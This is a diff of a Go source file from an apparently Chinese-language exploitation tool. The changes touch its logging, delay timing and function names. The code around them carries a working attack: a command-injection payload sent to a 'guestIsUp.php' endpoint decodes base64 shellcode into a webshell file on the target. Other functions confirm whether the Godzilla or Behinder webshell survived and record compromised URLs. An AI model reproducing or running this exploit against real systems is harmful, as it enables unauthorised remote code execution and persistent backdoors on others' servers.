@@ -14,10 +14,11 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
-func AddHistory(word string)  {
+func addHistory(word string)  {
 	//检测到漏洞时将URL信息写入history.txt
 	file, err := os.OpenFile(
 		"history.txt",
@@ -26,16 +27,19 @@ func AddHistory(word string)  {
 	)
 	if err != nil {
 		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
-		fmt.Printf("\n")
 	}
-	defer file.Close()
-	// 写字节到文件中
-	word = word + "\n"
-	byteSlice := []byte(word)
-	_ , err = file.Write(byteSlice)
-	if err != nil {
-		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
-		fmt.Printf("\n")
+	var mu sync.Mutex
+	defer mu.Unlock()
+	mu.Lock()
+	{
+		defer file.Close()
+		// 写字节到文件中
+		word = word + "\n"
+		byteSlice := []byte(word)
+		_ , err = file.Write(byteSlice)
+		if err != nil {
+			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
+		}
 	}
 }
 
@@ -64,10 +68,9 @@ func Check(target string, header map[string]string) (bool, error) {
 	defer reqs.Body.Close()
 
 	if reqs.StatusCode == 200 && strings.Contains(string(body), "File not found") == false && strings.Contains(string(body), "Authorization Required") == false{
-		AddHistory(target)
+		//addHistory(target)
 		return true, nil
 	}else {
-		fmt.Println(target)
 		return false, nil
 	}
 }
@@ -81,9 +84,9 @@ func Url(s string) (string,string) {
 }
 
 func Rce(s, shellname, shellcode string, header map[string]string) (string, error) {
+	//写入shell
 	target := s + "guestIsUp.php"
 	data := "ip=127.0.0.1 | echo \"" + shellcode + "\" | base64 -d > " + shellname + " &mac=00-00"
-
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
@@ -127,12 +130,14 @@ func failure(url, name string) {
 		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + url + "写入哥斯拉马失败！")
 	case name == "Behinder":
 		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + url + "写入冰蝎马失败！")
+	default:
+		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + url + "写入shell失败！")
 	}
 }
 
 func Judge(urll, name string, header map[string]string)  {
-	//1秒后检测写入木马是否被删除
-	time.Sleep(1 * time.Second)
+	//3秒后检测写入木马是否被删除
+	time.Sleep(3 * time.Second)
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
@@ -161,17 +166,19 @@ func Judge(urll, name string, header map[string]string)  {
 		failure(urll, name)
 		return
 	}
+	addHistory(urll)
 	fmt.Printf("\033[1;31m%s\033[0m\n","[+]成功写入shell：" + urll)
+	return
 }
 
-func GetUrl(file string) map[int]string {
+func GetFileUrl(file string) map[int]string {
 	fi, err := os.Open(file)
 	if err != nil {
 		fmt.Printf("\033[1;31m%s%v\033[0m\n","请输入正确的文件信息", err)
 	}
 	defer fi.Close()
 
-	url := make(map[int]string)
+	target := make(map[int]string)
 	i := 0
 	br := bufio.NewReader(fi)
 	for  {
@@ -179,10 +186,10 @@ func GetUrl(file string) map[int]string {
 		if eof == io.EOF {
 			break
 		}
-		url[i] = string(urll)
+		target[i] = string(urll)
 		i++
 	}
-	return url
+	return target
 }
 
 func Menu()  {
